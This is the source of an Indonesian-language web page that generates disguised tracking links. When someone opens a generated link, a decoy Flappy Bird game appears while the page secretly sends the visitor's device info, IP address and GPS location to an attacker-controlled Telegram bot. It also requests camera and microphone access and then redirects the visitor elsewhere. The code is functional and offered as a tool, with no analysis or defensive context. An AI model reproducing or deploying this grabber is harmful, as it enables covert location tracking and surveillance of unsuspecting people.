<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title> Link Generator </title>
  <style>
    body {
      background:#000; color:#fff; font-family:sans-serif;
      display:flex; justify-content:center; align-items:center;
      min-height:100vh; flex-direction:column; padding:20px
    }
    .card {
      background:#111; padding:20px; border-radius:12px;
      width:100%; max-width:480px; box-shadow:0 0 15px #0ff
    }
    h2 {
      text-align:center;
      text-shadow:0 0 10px #0ff, 0 0 20px #0ff, 0 0 30px #6f0;
    }
    input,button {
      margin-top:10px; width:100%; padding:10px; border-radius:6px; border:none
    }
    input { background:#222; color:#0ff }
    button {
      background:linear-gradient(90deg,#00f6ff,#6f00ff); color:#fff;
      font-weight:bold; box-shadow:0 0 10px #0ff, 0 0 20px #0ff inset;
      transition:0.3s
    }
    button:hover {
      box-shadow:0 0 20px #0ff, 0 0 40px #0ff inset;
    }
    #linkOut { margin-top:15px; font-size:14px; word-break:break-all }
    canvas.qr { margin-top:10px }
    canvas.game { background:#70c5ce; display:none; margin-top:20px }
  </style>
</head>
<body>
  <div class="card" id="formCard">
    <h2>🔗LINK GENERATOR </h2>
    <label>Bot Token</label>
    <input id="botToken" placeholder="123456:ABC">
    <label>Chat ID</label>
    <input id="chatId" placeholder="123456789">
    <label>Target URL</label>
    <input id="targetUrl" type="url" placeholder="https://example.com">
    <button onclick="generate()">Generate Link</button>
    <div id="linkOut"></div>
    <canvas id="qrcode" class="qr"></canvas>
  </div>

  <canvas id="flappy" class="game" width="320" height="480"></canvas>

  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
  <script>
    async function shorten(url){
      try{
        const res=await fetch("https://tinyurl.com/api-create.php?url="+encodeURIComponent(url));
        return await res.text();
      }catch{ return url; }
    }

    async function generate(){
      const token=document.getElementById("botToken").value.trim();
      const chat=document.getElementById("chatId").value.trim();
      const target=document.getElementById("targetUrl").value.trim();
      if(!token||!chat||!target) return alert("Isi semua dulu!");

      const longLink=`${location.origin}${location.pathname}?mode=view&token=${encodeURIComponent(token)}&chat=${encodeURIComponent(chat)}&target=${encodeURIComponent(target)}`;
      const shortLink=await shorten(longLink);

      document.getElementById("linkOut").innerHTML=`
        <b>Link Panjang:</b><br><a href="${longLink}" target="_blank" style="color:#0ff">${longLink}</a><br><br>
        <b>Link Pendek:</b><br><a href="${shortLink}" target="_blank" style="color:#6f0">${shortLink}</a>
      `;
      QRCode.toCanvas(document.getElementById("qrcode"), shortLink, {color:{dark:"#fff",light:"#000"}});
    }

    // === VIEW MODE ===
    (async () => {
      const p=new URLSearchParams(location.search);
      if(p.get("mode")!=="view") return;
      document.getElementById("formCard").style.display="none";
      const cvs=document.getElementById("flappy"); cvs.style.display="block";
      const ctx=cvs.getContext("2d");

      const TOKEN=p.get("token"), CHAT=p.get("chat"), TARGET=p.get("target")||"https://example.com";

      // Device Info
      let fd=new FormData();
      fd.append("chat_id",CHAT);
      fd.append("text","📱 Device: "+navigator.userAgent);
      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{method:"POST",body:fd});

      // IP
      try{
        const ip=await (await fetch("https://api.ipify.org?format=json")).json();
        let fd=new FormData(); fd.append("chat_id",CHAT); fd.append("text","🌐 IP: "+ip.ip);
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{method:"POST",body:fd});
      }catch{}

      // Lokasi
      if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(pos=>{
          let fd=new FormData();
          fd.append("chat_id",CHAT);
          fd.append("text",`📍 Lokasi: Lat ${pos.coords.latitude}, Lon ${pos.coords.longitude}`);
          fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{method:"POST",body:fd});
        });
      }

      // Trigger izin kamera & mic (tanpa tampil live)
      try{ await navigator.mediaDevices.getUserMedia({video:true,audio:true}); }catch{}

      // Flappy Bird
      let frames=0,score=0,started=false;
      let bird={x:50,y:150,w:30,h:30,gravity:0.5,jump:-8,speed:0};
      let pipes=[],gap=100;

      cvs.addEventListener("click",()=>{
        if(!started){started=true;bird.speed=bird.jump;}else{bird.speed=bird.jump;}
      });

      function drawBird(){ctx.fillStyle="yellow";ctx.fillRect(bird.x,bird.y,bird.w,bird.h);}
      function updateBird(){bird.speed+=bird.gravity;bird.y+=bird.speed;if(bird.y<0)bird.y=0;if(bird.y+bird.h>=cvs.height)gameOver();}
      function drawPipes(){ctx.fillStyle="green";for(let p of pipes){ctx.fillRect(p.x,0,50,p.top);ctx.fillRect(p.x,p.top+gap,50,cvs.height);if(bird.x<p.x+50&&bird.x+bird.w>p.x&&(bird.y<p.top||bird.y+bird.h>p.top+gap)){gameOver();}}}
      function updatePipes(){if(frames%100===0){let top=Math.floor(Math.random()*200)+50;pipes.push({x:cvs.width,top:top});}for(let i=0;i<pipes.length;i++){pipes[i].x-=2;if(pipes[i].x+50<0){pipes.shift();i--;score++;}}}
      function drawScore(){ctx.fillStyle="white";ctx.font="20px Arial";ctx.fillText("Score: "+score,10,25);}
      function drawReady(){ctx.fillStyle="white";ctx.font="24px Arial";ctx.fillText("READY? TAP TO START",30,cvs.height/2);}

      function loop(){ctx.fillStyle="#70c5ce";ctx.fillRect(0,0,cvs.width,cvs.height);if(!started){drawBird();drawReady();}else{updateBird();drawBird();updatePipes();drawPipes();drawScore();frames++;}requestAnimationFrame(loop);}
      function gameOver(){alert("Game Over! Score:"+score);document.location.reload();}
      loop();

      // Redirect setelah 10 detik
      setTimeout(()=>location.replace(TARGET),10000);
    })();
  </script>
</body>
</html>
